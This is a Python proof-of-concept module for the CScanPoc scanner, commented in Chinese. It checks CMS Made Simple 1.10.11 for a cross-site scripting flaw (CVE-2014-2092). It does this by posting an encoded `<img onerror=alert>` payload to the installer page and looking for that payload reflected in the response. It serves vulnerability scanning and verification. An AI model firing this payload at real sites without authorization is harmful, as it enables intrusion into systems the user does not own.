# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CMSMS_0103'  # 平台漏洞编号
    name = 'CMS Made Simple(CMSMS)存在跨站脚本'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-03-03'  # 漏洞公布时间
    desc = '''模版漏洞描述
    CMS Made Simple(简称CMSMS)是一款优秀的轻量级开源内容管理系统(CMS)。
    CMSMS存在跨站脚本漏洞。
    由于程序未能正确过滤用户提交的输入，攻击者可利用此漏洞在受影响的站点上下文的信任用户浏览器中执行任意HTML和脚本代码，
    窃取基于cookie的认证证书并发起其他攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-01396'  # 漏洞来源
    cnvd_id = 'CNVD-2014-01396'  # cnvd漏洞编号
    cve_id = 'CVE-2014-2092'  # cve编号
    product = 'CMSMS'  # 漏洞组件名称
    product_version = '1.10.11'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dc6f18bc-dab4-44f2-a65b-5607aa1438d5'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/k/cms/cmsmadesimple/install/index.php"
            vul_url = self.target + payload
            data = '''docroot=$("%3cimg%2fsrc%3d'x'%2fonerror%3dalert(cscan-hyhmnn)%3e")&docpath=%2Fhome%2Fk%2Fpublic_html%2Fcms%2Fcmsmadesimple&querystr=page&frontendlang=en_US&umask=022&host=localhost&dbms=mysqli&database=cms&username=root&password=superpass&db_port=0&timezone=Europe%2FBerlin&prefix=cms_&createtables=1&email_accountinfo=0&adminemail=admin%40here.com&adminusername=admin&adminpassword=password&page=7&default_cms_lang=en_US'''
            _response = requests.post(vul_url, data=data)
            if '''<a href="$("<img/src='x'/onerror=alert(cscan-hyhmnn)>''' in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
